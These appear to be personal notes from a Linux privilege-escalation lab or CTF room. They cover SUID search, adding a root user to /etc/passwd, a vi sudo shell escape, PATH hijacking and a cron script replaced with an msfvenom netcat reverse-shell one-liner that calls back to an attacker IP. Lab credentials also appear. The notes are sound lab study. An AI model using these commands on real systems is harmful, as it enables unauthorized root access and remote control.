# Common Linux Privesc

#Date: 15.09.2020

IP:`10.10.242.125`

# Enumeration

## linEnum - linpeas.sh way better

- how to get it? 
Option 1: start HTTP server on localmachine fe. `python -m SimpleHTTPServer 8000` and wget it on target machine

Option 2: pase it into fe. nano or vi

then `chmod +x LinEnum.sh`

run linenum.sh and got --> linenum.log


-------
### ./shell
ssh to target machine using provided credentials
user3:password

find in crontab (`cat /etc/crontab`) script running every 5 min (`autoscript.sh`)

## find SUID/GUID files 
`find / -perm -u=s -type f 2>/dev/null`

find ./shell in user3 homedir and got root privilage

-------
### /etc/passwd escelation
login with user7:password

generate new pass hash by `openssl passwd -1 -salt new 123` and got hash `$1$[new]$QVSf2wqMC/UUOoXEaxKxR0` for user new with pass 123


add to /etc/passwd "new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash" to make SuperUser new with pass 123

---------
### VI escalation
user8:password

sudo -l

run vi sudo vi 

open shell :!sh

---------
### cron

on local machinecreate payload: msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
got: `mkfifo /tmp/fpzr; nc 10.8.106.217 8888 0</tmp/fpzr | /bin/sh >/tmp/fpzr 2>&1; rm /tmp/fpzr`

replace autoscript.sh with payload

on local machine nc -lvp 8888

-----
### PATH

user5:password
cd ~ 
./script

echo "/bin/bash" > ls

chmod +x ls

export PATH=/tmp:$PATH

